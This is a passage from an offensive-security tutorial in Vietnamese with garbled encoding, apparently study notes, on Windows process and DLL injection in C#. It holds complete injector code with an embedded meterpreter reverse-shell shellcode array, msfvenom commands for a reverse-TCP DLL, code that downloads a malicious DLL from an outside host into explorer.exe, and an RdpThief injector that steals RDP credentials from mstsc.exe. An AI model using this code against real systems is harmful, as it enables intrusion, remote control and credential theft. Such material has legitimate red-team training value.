0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,
0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

IntPtr outSize;

WriteProcessMemory(hProcess,addr,buf , buf.Length, out outSize);
```

> á» Ä‘Ã¢y ta tháº¥y má»™t giÃ¡ trá»‹ "má»›i" Ä‘Æ°á»£c thÃªm vÃ o Ä‘Ã³ lÃ  `out` . Äá»ƒ nÃ³ chuyá»ƒn qua `reference` thay vÃ¬ lÃ  má»™t `Value` 


4. Tiáº¿p Ä‘áº¿n ta thá»±c thi shellcode thÃ´ng qua **CreateRemoteThread**

Tra cá»©u tÃ i liá»‡u Microsoft ra cÃ³

```
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
```

á» Ä‘Ã¢y ta tháº¥y cÃ³ nhiá»u tham sá»‘, nhÆ°ng ta khÃ´ng cáº§n pháº£i gá»i háº¿t , 

* Tham sá»‘ **hProcess** nhÆ° trÃªn
* Tham sá»‘ **lpThreadAttributes** mÃ´ táº£ báº£o máº­t mong muá»‘n cá»§a thread má»›i (máº·c Ä‘á»‹nh lÃ  NULL)
* Tham sá»‘  **dwStackSize** set kÃ­ch thÆ°á»›c Slack (Máº·c Ä‘á»‹nh Ä‘áº·t lÃ  0)
* Tham sá»‘ **lpStartAddress** chá»‰ Ä‘á»‹nh Ä‘á»‹a chá»‰ báº¯t Ä‘áº§u cá»§a thread, trong trÆ°á»ng há»£p cá»§a chÃºng ta, nÃ³ pháº£i báº¯t Ä‘áº§u báº±ng Ä‘á»‹a chá»‰ buffer mÃ  chÃºng ta Ä‘Ã£ cáº¥p phÃ¡t bÃªn trÃªn

* Tham sá»‘ lpParameter  lÃ  má»™t con trá» tá»›i cÃ¡c biáº¿n sáº½ Ä‘Æ°á»£c chuyá»ƒn Ä‘áº¿n hÃ m lpStartAddress . VÃ¬ Shellcode cá»§a chÃºng ta khÃ´ng cÃ³ báº¥t ká»³ options nÃ o, nÃªn Ä‘áº·t má»™t giÃ¡ trá»‹ NULL táº¡i Ä‘Ã¢y

* Hai tham sá»‘ **dwCreationFlags** vÃ  **lpThreadId** ta bá» qua

NhÆ° váº­y lÃ  cÃ³ láº§n lÆ°á»£t cÃ¡c giÃ¡ trá»‹ sau : hProcess , IntPtr.Zero ,  0 , addr , IntPtr.Zero , 0 ,IntPtr.Zero)

Code sáº½ thÃ nh

```csharp
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```


Äoáº¡n code cuá»‘i cÃ¹ng chÃºng ta nháº­n Ä‘Æ°á»£c

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ConsoleApp2
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
		IntPtr hProcess = OpenProcess(0x001F0FFF, false, 5536);
		IntPtr addr = VirtualAllocEx(hProcess,IntPtr.Zero, 0x1000, 0x3000,0x40);


byte[] buf = new byte[773] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,
0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x31,0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x00,
0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xdb,0x00,0x00,0x00,0x2f,0x4d,0x45,0x76,
0x4b,0x50,0x6c,0x44,0x53,0x69,0x76,0x4e,0x4e,0x35,0x30,0x7a,0x6c,0x4c,0x36,
0x5f,0x41,0x78,0x77,0x39,0x77,0x77,0x61,0x55,0x41,0x6d,0x43,0x6b,0x7a,0x4b,
0x5f,0x51,0x61,0x48,0x4d,0x58,0x53,0x70,0x75,0x4b,0x6b,0x73,0x73,0x73,0x69,
0x71,0x52,0x44,0x34,0x46,0x58,0x69,0x52,0x34,0x35,0x52,0x7a,0x33,0x38,0x6b,
0x72,0x68,0x75,0x41,0x6d,0x2d,0x66,0x6f,0x5a,0x36,0x49,0x32,0x6a,0x78,0x44,
0x76,0x75,0x72,0x6e,0x66,0x62,0x64,0x4f,0x45,0x33,0x57,0x33,0x65,0x54,0x51,
0x59,0x4a,0x59,0x4e,0x64,0x67,0x4d,0x66,0x4c,0x41,0x74,0x59,0x51,0x67,0x39,
0x4f,0x72,0x67,0x71,0x48,0x55,0x70,0x34,0x44,0x59,0x47,0x53,0x64,0x4d,0x37,
0x52,0x47,0x75,0x4d,0x32,0x46,0x43,0x6a,0x38,0x38,0x50,0x52,0x4d,0x58,0x59,
0x57,0x57,0x6d,0x56,0x55,0x41,0x71,0x6d,0x6f,0x70,0x36,0x2d,0x61,0x4d,0x45,
0x50,0x75,0x37,0x53,0x53,0x4f,0x41,0x4e,0x56,0x59,0x5a,0x79,0x5f,0x7a,0x5f,
0x74,0x47,0x71,0x55,0x73,0x32,0x50,0x64,0x2d,0x34,0x65,0x65,0x46,0x6e,0x78,
0x41,0x52,0x32,0x6d,0x6f,0x41,0x59,0x4f,0x4f,0x6f,0x6a,0x32,0x65,0x4f,0x51,
0x4c,0x47,0x4d,0x32,0x51,0x55,0x51,0x2d,0x2d,0x32,0x42,0x43,0x2d,0x33,0x64,
0x54,0x31,0x2d,0x78,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,
0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,
0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,
0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

IntPtr outSize;

WriteProcessMemory(hProcess,addr,buf , buf.Length, out outSize);

IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
		
        }
    }
}
```

5. ChÃºng ta tiáº¿n hÃ nh biÃªn dá»‹ch code & thá»±c thi (64bit)


![](https://images.viblo.asia/72ba577c-50a6-40d3-9eef-4317e111aa42.png)


[![Screenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_4.png)

> á» Ä‘Ã¢y ta tháº¥y PID cá»§a Malware Ä‘Ã£ trÃ¹ng vá»›i PID cá»§a `explorer`

# 2. DLL Injection

Process Injection cho phÃ©p chÃºng ta Ä‘Æ°a shellcode vÃ o má»™t process vÃ  thá»±c thi nÃ³. Äiá»u nÃ y lÃ  khÃ¡ hiá»‡u quáº£, tuy nhiÃªn vá»›i nhá»¯ng codebases lá»›n hÆ¡n hoáº·c tá»“n táº¡i DLL tá»« trÆ°á»›c. ChÃºng ta cÃ³ thá»ƒ Ä‘Æ°a toÃ n bá»™ DLL vÃ o má»™t prcocess thay vÃ¬ chá»‰ shellcode Ä‘Æ¡n thuáº§n

Khi má»™t process cáº§n sá»­ dá»¥ng má»™t API tá»« DLL , nÃ³ sáº½ gá»i tá»›i `LoadLibrary` API Ä‘á»ƒ load nÃ³ váº£o  virtual memory space. Trong trÆ°á»ng há»£p cá»§a chÃºng ta, chÃºng ta muá»‘n process sáº½ load DLL Ä‘á»™c háº¡i thÃ´ng qua cÃ¡c API Win32. 

Tuy nhiÃªn , `LoadLibrary` khÃ´ng thá»ƒ Ä‘Æ°á»£c load trÃªn má»™t remote proces, vÃ¬ váº­y chÃºng ta pháº£i thá»±c hiá»‡n sá»‘ má»™t thá»§ thuáº­t báº¯t buá»™c Ä‘á»ƒ buá»™c má»™t process nhÆ° `explorer.exe` load DLL cá»§a chÃºng ta.

Kiá»ƒm tra hÃ m `LoadLibrary` trÃªn Microsoft ta cÃ³

```
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
```

> Ta tháº¥y hÃ m chá»‰ yÃªu cáº§u duy nháº¥t má»™t tham sá»‘ lÃ  "lpLibFileName" : TÃªn cá»§a DLL Ä‘á»ƒ load
> Nhiá»u API Win32 cÃ³ hai biáº¿n thá»ƒ vá»›i háº­u tá»‘ "A" hoáº·c "W". Trong trÆ°á»ng há»£p nÃ y nÃ³ sáº½ lÃ  LoadLibraryA. NhÆ°ng chá»©c nÄƒng khÃ´ng thay Ä‘á»•i 


CÃ¡ch tiáº¿p cáº­n cá»§a chÃºng ta sáº½ cá»‘ gáº¯ng Ä‘Ã¡nh lá»«a process thá»±c thi `LoadLibrary` vá»›i Ä‘á»‘i sá»‘ chÃ­nh xÃ¡c. Quay láº¡i hÃ m `CreateRemoteThread`

```
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

ChÃºng ta quan tÃ¢m tá»›i 2 tham sá»‘

  * lpStartAddress : Äá»‹a chá»‰ báº¯t Ä‘áº§u cá»§a hÃ m cháº¡y trong thread má»›i
  
  * lpParameter: Äá»‹a chá»‰ bá»™ nhá»› cá»§a buffer chá»©a **tham sá»‘** cho hÃ m Ä‘Ã³ (Shellcode lÃ  IntPtr.Zero do shell thÃ¬ khÃ´ng cÃ³ tham sá»‘)

Äá»ƒ cung cáº¥p Ä‘á»‘i sá»‘ chÃ­nh xÃ¡c (DLL Ä‘á»™c háº¡i), chÃºng ta pháº£i cáº¥p phÃ¡t má»™t "vÃ¹ng" bÃªn trong process , sau Ä‘Ã³ copy tÃªn vÃ  Ä‘Æ°á»ng dáº«n cá»§a DLL vÃ o Ä‘Ã³ . Äá»‹a chá»‰ cá»§a "vÃ¹ng nÃ y" Ä‘Æ°á»£c cung cáº¥p lÃ m Ä‘á»‘i sá»‘ **lpParameter**

Tuy nhiÃªn, cÃ³ má»™t sá»‘ háº¡n cháº¿ mÃ  chÃºng ta sáº½ pháº£i xem xÃ©t. 

**Thá»© nháº¥t** : DLL pháº£i viáº¿t báº±ng C/C++ vÃ  pháº£i Unmanaged. DLL Ä‘Æ°á»£c viáº¿t trÃªn C# Ä‘Æ°á»£c managed sáº½ khÃ´ng hoáº¡t Ä‘á»™ng. ÄÆ¡n giáº£n chÃºng ta khÃ´ng thá»ƒ load DLL managed vÃ o má»™t Process Unmanaged

 > Táº¥t cáº£ cÃ¡c code mÃ  Ä‘Æ°á»£c viáº¿t trong C# Ä‘á»u Ä‘Æ°á»£c trá»±c tiáº¿p thá»±c thi báº±ng  CLR(Common Language Runtime) mÃ  chÃºng ta khÃ´ng thá»ƒ can thiá»‡p. CLR giÃºp quáº£n lÃ½ bá»™ nhá»›, xá»­ lÃ½ cÃ¡c váº¥n Ä‘á» báº£o máº­t vÃ  xá»­ lÃ½ cÃ¡c biáº¿n "rÃ¡c".

Kháº¯c phá»¥c Ä‘iá»u nÃ y, chÃºng ta sáº½ sá»­ dá»¥ng msfvenom Ä‘á»ƒ táº¡o mÃ£

**Thá»© 2**  ThÃ´ng thÆ°á»ng, cÃ¡c DLL chá»©a cÃ¡c API sáº½ Ä‘Æ°á»£c gá»i sau khi DLL Ä‘Æ°á»£c load. Äá»ƒ gá»i cÃ¡c API nÃ y, cÃ¡c á»©ng dá»¥ng pháº£i phÃ¢n giáº£i tÃªn cá»§a cá»§a chÃºng thÃ nh memory addresses vá»›i hÃ m `GetProcAddress`. Tuy nhiÃªn hÃ m nÃ y láº¡i khÃ´ng thá»ƒ phÃ¢n giáº£i API vá»›i dáº¡ng remote process (dáº¡ng ta tiÃªm vÃ o rá»“i thá»±c thi). Cho nÃªn ta pháº£i táº¡o nhá»¯ng file DLL Ä‘á»™c háº¡i non-standard

> Ã€ chÃºt ná»¯a quÃªn, LoadLibrary chá»‰ cháº¥p nháº­n cÃ¡c DLL tá»“n táº¡i trÃªn Disk. Do Ä‘Ã³ nÃ³ dá»… bá»‹ phÃ¡t hiá»‡n bá»Ÿi AV vÃ  Blue Team 

> CÃ³ 2 khÃ¡i niá»‡m chÃºng ta dá»… nháº§m láº«n Ä‘Ã³ lÃ  DLL Injection vÃ o DLL Hijacking. ÄÃ¢y lÃ  2 khÃ¡i niá»‡m hoÃ n toÃ n khÃ¡c nhau. Náº¿u nhÆ° DLL injection can thiá»‡p vÃ o process, Ã©p nÃ³ pháº£i cháº¡y DLL chÃºng ta mong muá»‘n thÃ¬ DLL Hijacking lÃ  quÃ¡ trÃ¬nh tÃ¬m kiáº¿m nhá»¯ng file DLL cÃ³ quyá»n báº£o máº­t yáº¿u - sau tiáº¿n hÃ nh thay tháº¿ nÃ³ vá»›i DLL Ä‘á»™c háº¡i

## 2.1 DLL Injection vá»›i C#

**NguyÃªn liá»‡u :**

* Payload DLL

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.130 LPORT=4444 -f dll -o /var/www/html/malware.dll
```


[![pSqScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/pSqScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/pSqScreenshot_2.png)


Code cuá»‘i cÃ¹ng chÃºng ta cÃ³

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\malware.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.138:8083/malware.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```

BiÃªn dá»‹ch vÃ  thá»±c thi 

![](https://images.viblo.asia/47e018a9-dde4-4b2b-8528-c04746a0ef6c.png)



```bash
cd /var/www/html
python3 -m http.server 8082
msfconsole ****
```

[![OIoScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/OIoScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/OIoScreenshot_4.png)

**Kiá»ƒm tra DLL Ä‘Ã£ tiÃªm trÃªn mÃ¡y náº¡n nhÃ¢n**

 * Má»Ÿ `Process Explorer` > Chá»n `explorer.exe`. Tiáº¿p Ä‘áº¿n á»Ÿ tab `View` > `Lower Pane View`  > select `DLLs`

Ta sáº½ tháº¥y DLL Ä‘á»™c háº¡i cá»§a chÃºng ta Ä‘Ã£ Ä‘Æ°á»£c load cÃ¹ng explorer.exe
 
![](https://images.viblo.asia/22be56d5-90f9-456e-b3ae-9b93ad988307.png)


## 2.2.  RDP "Keyloggers"

ThÃ´ng thÆ°á»ng, Ä‘á»ƒ Ä‘Ã¡nh cáº¯p thÃ´ng tin Ä‘Äƒng nháº­p RDP hay báº¥t ká»³ thÃ´ng tin nÃ o khÃ¡c trÃªn mÃ¡y náº¡n nhÃ¢n. Ta cÃ³ thá»ƒ nghÄ© ngay tá»›i Keyloggers. Tuy nhiÃªn Keyloggers  cÃ³ má»™t Ä‘iá»ƒm yáº¿u chÃ­ máº¡ng lÃ  nÃ³ ghi láº¡i toÃ n bá»™ thao tÃ¡c gÃµ cá»§a ngÆ°á»i dÃ¹ng. Khiáº¿n khi nháº­n Ä‘Æ°á»£c ná»™i dung file, ta khÃ´ng thá»ƒ phÃ¢n biá»‡t Ä‘Æ°á»£c thÃ´ng tin nÃ o lÃ  thÃ´ng tin cáº§n dÃ¹ng Ä‘á»ƒ Ä‘Äƒng nháº­p RDP. Module nÃ y sáº½ hÆ°á»›ng dáº«n cho chÃºng ta chuyÃªn biá»‡t hÃ³a ná»™i dung nÃ y.

Khi ngÆ°á»i dÃ¹ng sá»­ dá»¥ng Remote Desktop vá»›i `mstsc.exe`, há» nháº­p thÃ´ng tin xÃ¡c thá»±c dáº¡ng clear-text vÃ o á»©ng dá»¥ng. Báº±ng cÃ¡ch chÃ¨n cÃ¡c DLL Ä‘á»™c háº¡i vÃ o Ä‘Ã¢y ("`mstsc.exe`") ta cÃ³ thá»ƒ ghi láº¡i thao tÃ¡c gÃµ cá»§a ngÆ°á»i sá»­ dá»¥ng . DLL Ä‘á»™c háº¡i mang tÃªn `RdpThief `

RdpThief Ä‘Æ°á»£c viáº¿t dÆ°á»›i dáº¡ng DLL unmanaged vÃ  Ä‘Æ°á»£c Ä‘Æ°a vÃ o `mstsc.exe` trÆ°á»›c khi ngÆ°Æ¡i dÃ¹ng nháº­p thÃ´ng tin Ä‘Äƒng nháº­p

Quy trá»Ÿ láº¡i mÃ£ DLL injection phÃ­a trÃªn

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\malware.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.138:8083/malware.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```

> Ta nhá»› láº¡i chá»©c nÄƒng cá»§a Ä‘oáº¡n code nÃ y lÃ  Injection malware.dll Ä‘Æ°á»£c táº¡o ra tá»« msfvenom cho pocess `explorer.exe`. Váº­y mÃ£ sá»­a Ä‘á»•i ta sáº½ thay tháº¿ vá»›i chá»©c nÄƒng injection "RdpThief DLL" vÃ o "mstsc" lÃ  xong

[![uplScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/uplScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/uplScreenshot_1.png)


Ta tiáº¿n hÃ nh injection vá»›i code sau

```csharp
static void Main(string[] args)
{
  String dllName = "C:\\Tools\\RdpThief.dll";
  Process[] mstscProc = Process.GetProcessesByName("mstsc");
  int pid = mstscProc[0].Id;

  IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
  IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
  IntPtr outSize;
  Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
  IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
  IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
}
```
>KhÃ¡c vá»›i mÃ£ trÃªn, yÃªu cáº§u náº¡n nhÃ¢n pháº£i download DLL vá» rá»“i má»›i LoadlibaryA. Láº§n nÃ y ta tiáº¿n hÃ nh trá» tháº³ng vÃ o DLL Ä‘á»™c háº¡i.

Tuy nhiÃªn ta váº«n cÃ²n chÃºt láº¥n cáº¥n á»Ÿ Ä‘Ã¢y. 

NgÆ°á»i dÃ¹ng pháº£i cháº¡y remote desktop trÆ°á»›c, sau Ä‘Ã³ chÃºng ta pháº£i cháº¡y malware Ä‘á»ƒ injection vÃ o process  (vÃ¬ náº¿u ngÆ°á»i dÃ¹ng khÃ´ng cháº¡y trÆ°á»›c, thÃ¬ lÃ m gÃ¬ cÃ³ PID Ä‘á»ƒ mÃ  injection ğŸ˜—) 


VÃ¬ khÃ´ng biáº¿t khi nÃ o ngÆ°á»i dÃ¹ng khá»Ÿi cháº¡y `mstsc.exe` Ä‘á»ƒ khá»Ÿi cháº¡y mÃ£ Ä‘á»™c háº¡i cá»§a chÃºng ta trÆ°á»›c khi há» nháº­p thÃ´ng tin vÃ o. KhÃ³ hÆ¡n Ä‘Ã¡nh Ä‘á» !!!

Äá»ƒ cáº£i thiá»‡n Ä‘iá»u nÃ y, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng vÃ²ng láº·p `while` tá»± Ä‘á»™ng phÃ¡t hiá»‡n khi cÃ³ má»™t tiáº¿n trÃ¬nh `mstsc.exe` Ä‘Æ°á»£c khá»Ÿi táº¡o vÃ  sau Ä‘Ã³ injection trÆ°á»›c khi ngÆ°á»i dÃ¹ng nháº­p thÃ´ng tin Ä‘Äƒng nháº­p cá»§a mÃ¬nh vÃ o. ChÃºng ta cÅ©ng  sá»­ dá»¥ng Sleep Ä‘á»ƒ táº¡m dá»«ng 1s giá»¯a má»—i láº§n láº·p

Code hoÃ n chá»‰nh sáº½ lÃ 

```csharp
using System.Threading;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject {
  class Program {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

